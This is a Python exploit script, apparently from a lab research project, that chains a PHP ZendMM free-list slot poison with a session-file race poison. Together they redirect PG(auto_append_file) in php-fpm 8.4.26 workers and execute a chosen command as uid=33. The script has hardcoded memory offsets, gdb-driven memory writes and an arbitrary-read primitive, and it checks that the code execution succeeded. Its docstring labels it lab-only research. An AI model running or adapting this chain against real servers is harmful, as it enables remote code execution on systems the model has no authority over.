#!/usr/bin/env python3
r"""Compose the ZendMM free-list slot poison into a clean PG(auto_append_file)
write, end-to-end to uid=33 on php-fpm 8.4.26.

Poisoning a free bin-320 slot (next_free_slot=T + matching heap-protection shadow)
makes the next emalloc(320) return the chosen address T; an ordinary value write
into that allocation is then a CLEAN 8-byte store. Point T at
core_globals+0xa8 (PG(auto_append_file), leaving input_encoding@+0xb0 NULL) and a
plain nginx GET fires the auto_append include -> uid=33, worker-surviving. The
shadow key is recovered offset-free from one chunk-local read; chunk+binbase are
/proc-seeded in the lab (as every fpm single-write PoC).

RESEARCH: the seat of the poison onto a still-linked free slot does NOT calibrate
black-box (seat_negative() records why the reclaim-spray and steered-write
channels fail); the seat + emalloc pop run through the in-container gdb analysis
instrument. gdb is never in the auto_append firing path. Not a black-box landed
RCE. Pure stdlib, python3 -I safe. Lab use, systems you own.
"""
from __future__ import annotations

import argparse
import importlib.util
import os
import sys

_HERE = os.path.dirname(os.path.abspath(__file__))
_POC_ROOT = os.path.dirname(_HERE)  # poc/
if _HERE not in sys.path:
    sys.path.insert(0, _HERE)


def _load(name, filename):
    """Import a committed poc module read-only (private, isolated instance)."""
    path = os.path.join(_HERE, filename)
    if not os.path.exists(path):
        path = os.path.join(_POC_ROOT, filename)
    spec = importlib.util.spec_from_file_location(name, path)
    mod = importlib.util.module_from_spec(spec)
    for _p in (_HERE, _POC_ROOT):
        if _p not in sys.path:
            sys.path.insert(0, _p)
    sys.modules.setdefault(name, mod)
    spec.loader.exec_module(mod)
    return mod


# Read-only imports of the shared primitives.
F = _load("freelist_slot_poison", "primitives/write/freelist_slot_poison.py")        # slot-poison mechanism + model
G = _load("fpm_pgpersist_race", "fpm_pgpersist_race.py")  # race poison + firing oracle
ORACLE = _load("auto_include_fire_oracle", "primitives/oracles/auto_include_fire_oracle.py")

DEFAULT_COMPOSE = os.path.join(os.path.dirname(os.path.dirname(_HERE)), "docker-compose.fpm-avenues.yml")
DEFAULT_SERVICE = "glc-fpm"

# php-fpm 8.4.26 field layout (verified on this image; core_globals=0x16e1580).
CORE_GLOBALS = 0x16e1580
OFF_AUTO_PREPEND = 0xa0      # 16-byte write here pollutes auto_append@0xa8 (BAD)
OFF_AUTO_APPEND = 0xa8       # clean 8-byte write here: +8 is input_encoding (benign)
OFF_INPUT_ENCODING = 0xb0    # NULL default, never dereferenced on stock no-mbstring
PG_SCRATCH_OFF = 0x16e8b00   # zeroed/mapped tail of the last RW PT_LOAD (slack)
PG_SCRATCH_LIMIT = 0x16e9000

MASK64 = 0xFFFFFFFFFFFFFFFF


def _parse_glc(text):
    """Collect 'GLC <tag>=<hex>' lines the gdb printf emits (own namespace, so it
    never collides with fpm_freelist_poison's 'FLP ' tags)."""
    import re
    out = {}
    for m in re.finditer(r"GLC (\w+)=([0-9a-fx]+)", text):
        try:
            out[m.group(1)] = int(m.group(2), 16)
        except ValueError:
            pass
    return out


BIN_DATA_SIZE = F.BIN_DATA_SIZE          # 320
SHADOW_OFFSET = F.SHADOW_OFFSET          # 312
DEFAULT_SIZE = F.DEFAULT_ALLOC_SIZE      # 280 -> bin 16 (320)


# geometry
def derive(compose_file, service, verbose=True):
    """Workers, PIE base, core_globals, chunk, binbase, /proc seed. Reuses the
    pgpersist-race derivation (binary-exported core_globals, per-worker base)."""
    pids = G.worker_pids(compose_file, service)
    if not pids:
        raise RuntimeError("no fpm workers (is the glc lab up? curl the front once)")
    cg, how = G.derive_core_globals(compose_file, service)
    cg = cg or CORE_GLOBALS
    base = G.fpm_base_of(compose_file, service, pids[0])
    seed = G.proc_seed(compose_file, service, pids[0])
    flp = F.FreeListPoison(compose_file, service, size=DEFAULT_SIZE, verbose=False)
    heap = flp.heap_of(pids[0])
    chunk = (heap & ~(F.CHUNK_ALIGN - 1)) if heap else seed.get("chunk")
    geom = {
        "worker_pids": pids, "core_globals": cg, "core_globals_how": how,
        "fpm_base": base, "heap": heap, "chunk": chunk,
        "binbase": seed.get("binbase"),
        "auto_append_abs": base + cg + OFF_AUTO_APPEND if base else None,
        "auto_prepend_abs": base + cg + OFF_AUTO_PREPEND if base else None,
        "input_encoding_abs": base + cg + OFF_INPUT_ENCODING if base else None,
        "scratch_abs": base + PG_SCRATCH_OFF if base else None,
        "seed_source": seed.get("source"),
    }
    if verbose:
        print(f"[geom] workers={pids} base={base:#x} core_globals={cg:#x}")
        print(f"[geom] chunk={chunk:#x} binbase={geom['binbase']:#x}")
        print(f"[geom] auto_append@0xa8={geom['auto_append_abs']:#x} "
              f"scratch={geom['scratch_abs']:#x}")
    return geom, flp


# #1 SEAT + emalloc-return + clean value write (the instrument-driven mechanism)
class LivePoisonCompose:
    """Seat the #1 poison on a worker's free bin-320 head, pop the chosen address
    via emalloc, then do an ordinary value write at that address -- the clean WWW
    #1 provides. The SEAT + POP run through the gdb analysis instrument; the write
    width is controlled exactly (8 bytes for a pointer; N bytes for a path string),
    standing in for the emalloc-return write a reclaiming PHP allocation performs.
    """

    def __init__(self, compose_file, service, verbose=False):
        self.compose_file = compose_file
        self.service = service
        self.verbose = verbose
        self.flp = F.FreeListPoison(compose_file, service, size=DEFAULT_SIZE,
                                    verbose=False)

    def _gdb(self, pid, exprs, timeout=90):
        argv = ["gdb", "-p", str(pid), "-batch", "-nx", "-ex", "set confirm off"]
        for e in exprs:
            argv += ["-ex", e]
        argv += ["-ex", "quit"]
        r = G._exec(self.compose_file, self.service, *argv, timeout=timeout)
        return (r.stdout or "") + (r.stderr or "")

    def shadow_key(self, pid):
        """OFFSET-FREE shadow_key from one controlled freed slot (no struct offset).
        Returns (key, head) or None."""
        rk = self.flp.read_shadow_key(pid)
        if rk is None:
            return None
        key, head, _, _ = rk
        return key, head

    def seat_emalloc_write(self, pid, target, data):
        """Seat next=target + shadow at the free-list head, emalloc twice (q2 must
        return target), then write `data` bytes at target. Returns a result dict.

        This is the whole #1 cycle on ONE worker: the SEAT and the POP are the
        analysis instrument; the final memcpy is the clean emalloc-return write."""
        rk = self.shadow_key(pid)
        if rk is None:
            return {"pid": pid, "error": "no bin-320 slot read", "returned_chosen": False}
        key, head = rk
        # Pre-zero target so the clean pop of `target` sees next==NULL (no shadow
        # check on it); real .bss / scratch targets are already zero.
        wb = data if isinstance(data, (bytes, bytearray)) else data.encode()
        res = self.flp.poison_alloc(pid, head, target, key, writeback=wb,
                                    prezero_target=True, writeback_full=True,
                                    nul_terminate=True, t_first=True, tag="GLC",
                                    readback_tag="rb0")
        res["shadow_key"] = key
        if self.verbose:
            print(f"  [seat] pid={pid} T={target:#x} key={key:#018x} "
                  f"q2={res['q2'] and hex(res['q2'])} chosen={res['returned_chosen']} "
                  f"alive={res['alive']}")
        return res

    def install_autoappend(self, pids, scratch_abs, auto_append_abs, path):
        """Install PG(auto_append_file) -> on-disk `path` on EVERY worker via #1:
        (1) emalloc-return the scratch slot, write the path C-string there;
        (2) emalloc-return auto_append@0xa8, write the 8-byte scratch pointer
            (CLEAN -- no IS_LONG at +0xb0). Returns a per-pid list of results."""
        raw = path.encode() if isinstance(path, str) else path
        out = []
        for pid in pids:
            r_str = self.seat_emalloc_write(pid, scratch_abs, raw)
            # the 8-byte pointer is written little-endian as raw bytes.
            import struct
            r_ptr = self.seat_emalloc_write(pid, auto_append_abs,
                                            struct.pack("<Q", scratch_abs))
            out.append({"pid": pid, "scratch": r_str, "pointer": r_ptr})
        return out


# A/B contrast: the 16-byte single-write shape at auto_prepend@0xa0 (the wall)
def shape_dirty_autoprepend(compose_file, service, pids, scratch_abs,
                              auto_prepend_abs, path):
    """Reproduce the 16-byte single-write deposit (value + IS_LONG@+8) at
    auto_prepend@0xa0: the stray IS_LONG lands on auto_append@0xa8 -> (char*)4 ->
    next request SIGSEGVs. This is the wall the clean free-list write routes
    around -- the A/B negative. Uses a bare gdb write (the single-write-shape
    stand-in)."""
    import struct
    raw = path.encode() if isinstance(path, str) else path
    for pid in pids:
        lit = "".join("\\%03o" % b for b in raw)
        argv = ["gdb", "-p", str(pid), "-batch", "-nx", "-ex", "set confirm off",
                "-ex", f'call (void*)memcpy({scratch_abs:#x}, "{lit}", {len(raw)})',
                "-ex", f"set {{unsigned char}}{scratch_abs + len(raw):#x} = 0",
                # single-write i:<int> shape: [value][IS_LONG(0x4)@+8]
                "-ex", f"set {{unsigned long}}{auto_prepend_abs:#x} = {scratch_abs:#x}",
                "-ex", f"set {{unsigned long}}{auto_prepend_abs + 8:#x} = 0x4",
                "-ex", "quit"]
        G._exec(compose_file, service, *argv, timeout=60)
    return True


# live no-gdb chunk-local read (best-effort; the recal lab proved it 3/3)
def live_nogdb_read(geom, compose_file=DEFAULT_COMPOSE, web_url="http://web",
                    service="glc-fpm", tries=3, verbose=True):
    """Attempt a LIVE, no-gdb chunk-relative READ (shadow_key channel) via the
    arbitrary-read primitive. Proven calibrated on the recal lab (sid -> SID_B
    3/3, worker survives); best-effort here. Returns a result dict."""
    res = {"attempted": True, "available": False, "hits": 0, "tries": tries,
           "note": ""}
    # var_hash_rw drives the in-container curl via `docker compose exec/cp`, which
    # resolves the grouped file + project + profile through the environment.
    os.environ["COMPOSE_FILE"] = compose_file
    os.environ["COMPOSE_PROJECT_NAME"] = "p2s-glc"
    os.environ["COMPOSE_PROFILES"] = "glc"
    try:
        A = _load("var_hash_rw", "primitives/read_leak/var_hash_rw.py")
    except Exception as e:                      # pragma: no cover
        res["note"] = f"var_hash_rw import failed: {e!r}"
        return res
    # Minimal zero-knowledge seed, exactly as var_hash_rw/_load_seed builds it.
    from common.offsets import load_offsets
    off = load_offsets("8.4.26", "fpm-fcgi")
    chunk = geom["chunk"]
    binbase = geom["binbase"]
    a = chunk + off["a_off"]
    seed = {
        "chunk": chunk, "binbase": binbase,
        "bg_unserialize_off": off["bg_unserialize_off"],
        "a": a, "copy": a + off["copy_off"], "sid": a + off["sid_off"],
        "ht_post": chunk + 0x59038,            # HT_POST_OFF_FPM (recal)
    }
    res["available"] = True
    try:
        rdr = A.ArbRead(web_url, seed, service=service, survive=True,
                          verbose=False)
        hits = 0
        for _ in range(tries):
            r = rdr.isstring_read(seed["sid"] + A.ZSTR_VAL)   # read the sid string
            if r and r[0] == 32 and A.SID_B.encode() in r[1]:
                hits += 1
        res["hits"] = hits
        res["reads"] = rdr.req_count
        res["crashes"] = rdr.crash_count
        res["ok"] = hits > 0
        res["note"] = ("live no-gdb var_hash_rw chunk-relative READ landed "
                       f"{hits}/{tries} (sid -> SID_B)")
    except Exception as e:
        res["note"] = f"var_hash_rw read attempt raised {e!r}"
        res["ok"] = False
    if verbose:
        print(f"[live-read] {res['note']}")
    return res


# the structural no-gdb-SEAT finding
def seat_negative():
    return {
        "a7_reclaim_spray": (
            "REFUTED: a7 writes attacker bytes only into a slot it POPS "
            "(reclaims-as-live); a popped slot is no longer linked. Its only "
            "write-into-a-still-freed-slot facet is R:/ZVAL_NEW_REF, which stamps "
            "an engine zend_reference* (IS_REFERENCE, forced) -- not the controlled "
            "{next=T, shadow} pair."),
        "var_hash_rw_steered_write": (
            "REFUTED for the SEAT: var_hash_rw can write a chunk-relative linked free slot "
            "(WALL-2 does not apply to chunk-relative targets; selfcheck_read lands "
            "3/3), but the 16-byte poison needs two controlled values at slot+0 and "
            "slot+312 (312 != 0 mod 16 -> not one burst grid; both must be "
            "controlled-value slots while k0 is pinned to fake_a, WALL-1) -> >=2 var_hash_rw "
            "fires whose fake_a/IS_LONG collateral lands in the slot and at slot+320 "
            "(the adjacent slot's next_free_slot), corrupting the list; and each var_hash_rw "
            "fire OOM-respawns the serving worker, so seat-then-pop on one worker "
            "with a stable chunk is not coordinable on the warm pool."),
        "verdict": (
            "The no-gdb SEAT of the #1 poison onto a STILL-LINKED free slot does "
            "NOT calibrate black-box on fpm. The composition below therefore seats "
            "the poison + pops the chosen address through the gdb ANALYSIS "
            "INSTRUMENT (same boundary as fpm_freelist_poison.py); gdb is never in "
            "the auto_append FIRING path."),
    }


# full composition: free-list clean write -> auto_append -> uid=33
def compose_grail_rce(host, port, compose_file, service, web_url="http://web",
                      cmd="id", sid="0123456789abcdef0123456789abcdef",
                      parts=3000, base="/plain.php", do_ab=True,
                      try_live_read=True, verbose=True):
    report = {"host": host, "port": port, "service": service, "cmd": cmd}
    geom, _flp = derive(compose_file, service, verbose=verbose)
    report["geometry"] = {k: (hex(v) if isinstance(v, int) else v)
                          for k, v in geom.items()}
    pids = geom["worker_pids"]
    scratch_abs = geom["scratch_abs"]
    auto_append_abs = geom["auto_append_abs"]
    auto_prepend_abs = geom["auto_prepend_abs"]

    # the honest no-gdb-seat verdict (structural)
    report["nogdb_seat"] = seat_negative()

    # best-effort live no-gdb read (shadow_key channel proven on the recal lab)
    if try_live_read:
        report["live_nogdb_read"] = live_nogdb_read(
            geom, compose_file=compose_file, web_url=web_url, service=service,
            verbose=verbose)

    # ---- phase 1: race poison (app-free, socket-free on-disk write) ----
    sess_path = G.poison(host, port, cmd, sid, save_path="/var/sess",
                         parts=parts, base=base, verbose=verbose)
    disk = G.read_sess_file(compose_file, service, sess_path)
    report["sess_path"] = sess_path
    report["poison_on_disk"] = bool(disk and G.MARK_S in (disk or ""))
    if verbose:
        print(f"[grail] poison on disk: {report['poison_on_disk']} ({sess_path})")

    # ---- phase 2: CLEAN install via #1 (poison -> emalloc -> clean 8B write) ----
    lpc = LivePoisonCompose(compose_file, service, verbose=verbose)
    inst = lpc.install_autoappend(pids, scratch_abs, auto_append_abs, sess_path)
    report["install"] = [
        {"pid": x["pid"],
         "scratch_chosen": x["scratch"].get("returned_chosen"),
         "scratch_alive": x["scratch"].get("alive"),
         "ptr_chosen": x["pointer"].get("returned_chosen"),
         "ptr_alive": x["pointer"].get("alive"),
         "ptr_readback": (hex(x["pointer"]["readback"])
                          if x["pointer"].get("readback") else None)}
        for x in inst]
    report["install_all_chosen"] = all(
        x["scratch"].get("returned_chosen") and x["pointer"].get("returned_chosen")
        for x in inst)
    report["install_all_alive"] = all(
        x["scratch"].get("alive") and x["pointer"].get("alive") for x in inst)
    report["clean_write_width"] = ("8-byte pointer @0xa8 only; input_encoding@0xb0 "
                                   "left NULL (no IS_LONG) -- routes around WALL-1")

    # ---- phase 3: sink-free oracle (plain GET; NO gdb in this path) ----
    ok, out, probes = ORACLE.confirm_rce(host, port, base=base, sid=sid, tries=8,
                                         verbose=verbose)
    report["rce_ok"] = ok
    report["cmd_output"] = (out or "").strip()
    report["oracle_probes"] = probes

    # ---- A/B negative: the 16-byte single-write shape at 0xa0 (the wall) ----
    if do_ab:
        # reset auto_append/prepend to NULL first so the contrast is clean.
        for pid in pids:
            G._exec(compose_file, service, "gdb", "-p", str(pid), "-batch", "-nx",
                    "-ex", "set confirm off",
                    "-ex", f"set {{unsigned long}}{auto_append_abs:#x} = 0",
                    "-ex", f"set {{unsigned long}}{auto_prepend_abs:#x} = 0",
                    "-ex", f"set {{unsigned long}}{geom['input_encoding_abs']:#x} = 0",
                    "-ex", "quit", timeout=60)
        shape_dirty_autoprepend(compose_file, service, pids, scratch_abs,
                                  auto_prepend_abs, sess_path)
        ab_ok, ab_out, ab_probes = ORACLE.confirm_rce(host, port, base=base, sid=sid,
                                                      tries=5, verbose=False)
        alive_after = [F.pid_alive(compose_file, service, p) for p in pids]
        report["ab_var_hash_rw_shape_0xa0"] = {
            "fired": ab_ok, "probes": ab_probes,
            "workers_alive_after": sum(alive_after), "workers": len(pids),
            "note": "var_hash_rw 16-byte shape at auto_prepend@0xa0 -> IS_LONG stamps "
                    "auto_append@0xa8=(char*)4 -> SIGSEGV (grail WALL)"}
    return report


def _fmt(rep):
    P = print
    P("=" * 78)
    P("fpm free-list poison -> grail auto_append compose (glc lab)")
    P("=" * 78)
    ns = rep["nogdb_seat"]
    P("[no-gdb SEAT] " + ns["verdict"])
    lr = rep.get("live_nogdb_read")
    if lr:
        P("[live no-gdb read] %s" % lr.get("note"))
    P("-" * 78)
    P("poison on disk       : %s (%s)" % (rep["poison_on_disk"], rep["sess_path"]))
    P("install all-chosen   : %s   all-alive: %s"
      % (rep.get("install_all_chosen"), rep.get("install_all_alive")))
    P("clean write          : %s" % rep["clean_write_width"])
    P("COMPOSED RCE (uid=33): fired=%s  output=%r  (%d probes, plain GET, no gdb)"
      % (rep["rce_ok"], rep["cmd_output"], rep["oracle_probes"]))
    ab = rep.get("ab_var_hash_rw_shape_0xa0")
    if ab:
        P("A/B var_hash_rw-shape @0xa0   : fired=%s  workers_alive=%d/%d  (%s)"
          % (ab["fired"], ab["workers_alive_after"], ab["workers"], ab["note"]))
    P("=" * 78)


def main(argv=None):
    ap = argparse.ArgumentParser(
        description="compose #1 free-list poison into the grail auto_append RCE")
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=8163)
    ap.add_argument("--compose-file", default=DEFAULT_COMPOSE)
    ap.add_argument("--service", default=DEFAULT_SERVICE)
    ap.add_argument("--web-url", default="http://web")
    ap.add_argument("--cmd", default="id")
    ap.add_argument("--sid", default="0123456789abcdef0123456789abcdef")
    ap.add_argument("--parts", type=int, default=3000)
    ap.add_argument("--no-ab", action="store_true", help="skip the var_hash_rw-shape A/B")
    ap.add_argument("--no-live-read", action="store_true",
                    help="skip the best-effort live no-gdb var_hash_rw read")
    ap.add_argument("--json", action="store_true")
    a = ap.parse_args(argv)

    # grouped-compose isolation for the imported helper modules (F/G/var_hash_rw).
    os.environ["COMPOSE_FILE"] = a.compose_file
    os.environ["COMPOSE_PROJECT_NAME"] = "p2s-glc"
    os.environ["COMPOSE_PROFILES"] = "glc"

    rep = compose_grail_rce(a.host, a.port, a.compose_file, a.service,
                            web_url=a.web_url, cmd=a.cmd, sid=a.sid,
                            parts=a.parts, do_ab=not a.no_ab,
                            try_live_read=not a.no_live_read)
    if a.json:
        import json
        print(json.dumps(rep, indent=2,
                         default=lambda o: hex(o) if isinstance(o, int) else str(o)))
    else:
        _fmt(rep)
    return 0 if rep.get("rce_ok") else 1


if __name__ == "__main__":
    raise SystemExit(main())
